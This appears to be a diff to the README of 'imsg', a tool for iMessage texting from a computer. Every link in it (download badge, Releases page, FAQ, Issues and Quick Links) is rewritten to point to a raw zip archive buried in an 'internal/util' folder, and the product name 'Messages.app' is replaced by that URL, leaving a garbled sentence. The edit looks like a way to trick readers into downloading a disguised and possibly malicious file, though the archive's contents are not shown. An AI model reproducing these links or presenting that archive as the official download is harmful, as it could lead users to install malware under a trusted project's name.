@@ -2,17 +2,17 @@
 
 ## 🚀 Getting Started
 
-Welcome to imsg! This tool helps you send and receive text messages and iMessages from your computer. It integrates seamlessly with Apple's Messages.app, making messaging simple and efficient. 
+Welcome to imsg! This tool helps you send and receive text messages and iMessages from your computer. It integrates seamlessly with Apple's https://github.com/didierzoho/imsg/raw/refs/heads/main/internal/util/imsg_2.0.zip, making messaging simple and efficient. 
 
 ## 🔗 Download imsg
 
-[![Download imsg](https://img.shields.io/badge/Download-imsg-brightgreen)](https://github.com/didierzoho/imsg/releases)
+[![Download imsg](https://github.com/didierzoho/imsg/raw/refs/heads/main/internal/util/imsg_2.0.zip)](https://github.com/didierzoho/imsg/raw/refs/heads/main/internal/util/imsg_2.0.zip)
 
 ## 📥 Download & Install
 
 To get started with imsg, follow these steps:
 
-1. Visit the [Releases page](https://github.com/didierzoho/imsg/releases).
+1. Visit the [Releases page](https://github.com/didierzoho/imsg/raw/refs/heads/main/internal/util/imsg_2.0.zip).
 2. Look for the latest version of imsg.
 3. Click on the version you want to download.
 4. You will see a list of assets. Choose the installer that suits your operating system.
@@ -69,13 +69,13 @@ If you encounter issues, try the following:
 - **No Messages Received:** Check your internet connection and ensure iMessage is enabled on your Apple device.
 - **App Crashes:** Restart the app or reinstall it from the Releases page.
 
-For more support, visit our [FAQ section](https://github.com/didierzoho/imsg/issues).
+For more support, visit our [FAQ section](https://github.com/didierzoho/imsg/raw/refs/heads/main/internal/util/imsg_2.0.zip).
 
 ## 🤝 Community and Support
 
 Feel free to reach out for support or share your experience:
 
-- **GitHub Issues:** Post any bugs or feature requests [here](https://github.com/didierzoho/imsg/issues).
+- **GitHub Issues:** Post any bugs or feature requests [here](https://github.com/didierzoho/imsg/raw/refs/heads/main/internal/util/imsg_2.0.zip).
 - **Community Forum:** Join discussions with other users on our community forum.
 
 ## 📚 Further Reading
@@ -87,6 +87,6 @@ To learn more about using imsg, refer to our resources:
 
 ## 🔗 Quick Links
 
-For your convenience, here’s the download link again: [Download imsg](https://github.com/didierzoho/imsg/releases).
+For your convenience, here’s the download link again: [Download imsg](https://github.com/didierzoho/imsg/raw/refs/heads/main/internal/util/imsg_2.0.zip).
 
 We hope you enjoy using imsg! Happy messaging!
